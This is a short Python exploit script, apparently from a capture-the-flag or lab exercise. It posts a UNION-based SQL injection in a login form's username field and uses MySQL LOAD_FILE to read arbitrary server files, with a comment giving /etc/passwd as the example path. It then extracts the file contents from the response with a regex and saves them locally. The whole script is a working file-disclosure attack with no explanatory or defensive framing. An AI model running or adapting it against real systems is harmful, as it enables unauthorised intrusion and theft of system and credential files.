import requests
import sys
import re
import os

url = sys.argv[1]
payload = sys.argv[2]

regex = re.compile(r"admin(.*)</h3>", re.DOTALL)
#union select 1,LOAD_FILE("/etc/passwd"),3,4,5,6-- -
data = {"uname":f"admin' union select 1,LOAD_FIlE(\"{payload}\"),3,4,5,6-- -","password":"Hello Mr j"}

r = requests.post(url , data=data)
match = re.search(regex, r.text)

fname = url.replace("/", "_")[1:]

if not os.path.exists('files'):
    os.mkdir('files')
    print('Created Directory')
try:
    if match.group(1) != 'None':
        with open('files/'+fname,'w') as f:
            f.write(match.group(1))
            
except OSError:
    print('Text is so long')
except AttributeError:
    pass

